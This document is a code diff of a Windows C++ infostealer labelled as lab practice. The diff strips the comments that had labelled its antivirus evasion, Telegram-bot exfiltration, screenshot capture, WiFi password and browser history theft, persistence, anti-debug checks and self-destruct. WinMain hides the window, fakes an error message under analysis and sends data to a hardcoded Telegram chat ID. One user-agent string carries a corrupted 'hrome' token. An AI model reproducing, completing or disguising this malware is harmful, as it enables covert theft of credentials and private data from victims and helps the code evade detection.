@@ -1,10 +1,7 @@
-// lab_practice_v3.cpp
-// FOR AUTHORIZED LAB USE ONLY - EDUCATIONAL PURPOSES
-// Advanced C++ Implementation with String Encryption & Behavioral Masking
-
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <wininet.h>
+
 #include <shlobj.h>
 #include <psapi.h>
 #include <iphlpapi.h>
@@ -48,9 +45,6 @@
 
 namespace fs = std::filesystem;
 
-// ============================================================
-// ANTI-VIRUS EVASION: STRING ENCRYPTION AND OBFUSCATION
-// ============================================================
 
 #pragma optimize("", off)
 #pragma check_stack(off)
@@ -90,7 +84,6 @@ public:
     }
 };
 
-// Helper macro for string obfuscation
 #define OBFUSCATE(str) \
     []() -> std::string { \
         static const std::vector<char> encrypted = StringEncryptor::encrypt(str); \
@@ -103,7 +96,6 @@ public:
         return decrypted; \
     }()
 
-// Junk code to confuse analysis
 void junk_code_sequence() {
     volatile int x = 0;
     volatile int y = 0;
@@ -125,9 +117,7 @@ void junk_code_sequence() {
     }
 }
 
-// ============================================================
-// REAL BROWSER USER AGENTS
-// ============================================================
+
 
 class UserAgentManager {
 private:
@@ -140,7 +130,7 @@ public:
         user_agents = {
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"),
-            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
+            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) hrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0"),
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.4.0"),
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"),
@@ -159,9 +149,6 @@ public:
     }
 };
 
-// ============================================================
-// BEHAVIORAL MASKING - LEGITIMATE ACTIVITY SIMULATION
-// ============================================================
 
 class BehavioralMasker {
 private:
@@ -297,9 +284,6 @@ public:
     }
 };
 
-// ============================================================
-// BASE64 DECODING FOR BOT TOKENS (WITH STRING ENCRYPTION)
-// ============================================================
 
 class Base64Decoder {
 public:
@@ -331,9 +315,7 @@ public:
     }
 };
 
-// ============================================================
-// TELEGRAM BOT MANAGER WITH FALLBACK & REAL USER AGENTS
-// ============================================================
+
 
 class TelegramBotManager {
 private:
@@ -628,9 +610,7 @@ private:
     }
 };
 
-// ============================================================
-// SCREENSHOT CAPTURE (IN MEMORY ONLY)
-// ============================================================
+
 
 class ScreenshotCapture {
 public:
@@ -726,9 +706,7 @@ private:
     }
 };
 
-// ============================================================
-// SYSTEM INFORMATION COLLECTOR (WITH STRING ENCRYPTION)
-// ============================================================
+
 
 class SystemInfo {
 public:
@@ -840,9 +818,7 @@ public:
     }
 };
 
-// ============================================================
-// WIFI PASSWORD EXTRACTOR
-// ============================================================
+
 
 class WiFiPasswordExtractor {
 public:
@@ -898,9 +874,6 @@ public:
     }
 };
 
-// ============================================================
-// BROWSER HISTORY EXTRACTOR (WITHOUT SQLITE)
-// ============================================================
 
 class BrowserHistoryExtractor {
 public:
@@ -969,9 +942,7 @@ public:
     }
 };
 
-// ============================================================
-// PERSISTENCE ENGINE (NON-ADMIN METHODS) WITH OBFUSCATION
-// ============================================================
+
 
 class PersistenceEngine {
 private:
@@ -1186,9 +1157,7 @@ private:
     }
 };
 
-// ============================================================
-// ANTI-DEBUG / SANDBOX DETECTION
-// ============================================================
+
 
 class AntiDebug {
 public:
@@ -1285,9 +1254,7 @@ public:
     }
 };
 
-// ============================================================
-// MAIN PAYLOAD
-// ============================================================
+
 
 class LabPayload {
 private:
@@ -1488,9 +1455,7 @@ private:
     }
 };
 
-// ============================================================
-// ANTI-ANALYSIS ENTRY POINT
-// ============================================================
+
 
 void SelfDestruct() {
     char module_path[MAX_PATH];
@@ -1512,14 +1477,13 @@ void SelfDestruct() {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    LPSTR lpCmdLine, int nCmdShow) {
-    // Hide console
+    
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
     
-    // Initialize random seed
+    
     srand(time(NULL) ^ GetCurrentProcessId() ^ GetTickCount());
     
-    // Check for analysis environment
     if (AntiDebug::isDebuggerPresent() || AntiDebug::isSandbox()) {
         // Launch decoy and self-destruct
         MessageBoxA(NULL, OBFUSCATE("Application failed to initialize properly.").c_str(),
@@ -1528,18 +1492,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         return 0;
     }
     
-    // Initialize Winsock
+    
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     
-    // Your Telegram chat ID (hardcoded as requested)
+    
     std::string chat_id = OBFUSCATE("7369364451");
     
-    // Start payload
+    
     LabPayload payload(chat_id);
     payload.start();
     
-    // Message loop to keep process alive
+    
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
